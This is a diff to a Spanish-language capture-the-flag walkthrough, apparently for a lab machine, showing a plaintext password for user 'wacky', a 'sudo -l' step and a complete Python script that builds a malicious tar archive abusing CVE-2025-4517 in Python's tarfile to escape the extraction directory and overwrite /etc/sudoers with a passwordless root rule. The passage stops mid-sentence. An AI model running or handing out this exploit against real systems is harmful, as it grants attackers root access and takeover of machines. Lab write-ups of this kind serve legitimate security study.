@@ -58,7 +58,70 @@ wacky::!#7Blushing^*Bride5
 ```
 
 Obteniendo una shell como `wacky`
+ ejecutamos el comonado 
+ ```shell
+ sudo -l
+ ```
 
+En `/tmp` crearemos un archivo llamado `cve.py`
+```python
+import tarfile
+import os
+import io
+import sys
 
+# Create a malicious tar that exploits CVE-2025-4517
+# This will write to /etc/sudoers (or /etc/passwd) outside the extraction directory
 
-shadow 256 hashcat
+comp = 'd' * 247  # For Linux
+steps = "abcdefghijklmnop"
+path = ""
+
+with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
+    # Create directory structure with symlinks
+    for i in steps:
+        a = tarfile.TarInfo(os.path.join(path, comp))
+        a.type = tarfile.DIRTYPE
+        tar.addfile(a)
+        
+        b = tarfile.TarInfo(os.path.join(path, i))
+        b.type = tarfile.SYMTYPE
+        b.linkname = comp
+        tar.addfile(b)
+        path = os.path.join(path, comp)
+    
+    # Create the long symlink that bypasses PATH_MAX check
+    linkpath = os.path.join("/".join(steps), "l"*254)
+    l = tarfile.TarInfo(linkpath)
+    l.type = tarfile.SYMTYPE
+    l.linkname = "../" * len(steps)
+    tar.addfile(l)
+    
+    # Create escape symlink pointing to /etc
+    e = tarfile.TarInfo("escape")
+    e.type = tarfile.SYMTYPE
+    e.linkname = linkpath + "/../../../../../../../etc"
+    tar.addfile(e)
+    
+    # Create a hardlink to /etc/sudoers
+    f = tarfile.TarInfo("sudoers_link")
+    f.type = tarfile.LNKTYPE
+    f.linkname = "escape/sudoers"
+    tar.addfile(f)
+    
+    # Now overwrite /etc/sudoers with our malicious content
+    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
+    c = tarfile.TarInfo("sudoers_link")
+    c.type = tarfile.REGTYPE
+    c.size = len(content)
+    tar.addfile(c, fileobj=io.BytesIO(content))
+    
+print("[+] Malicious tar backup_9999.tar created")
+```
+
+Lo ejecutamos con
+```shell
+python3 cve.py
+```
+
+Y nos c
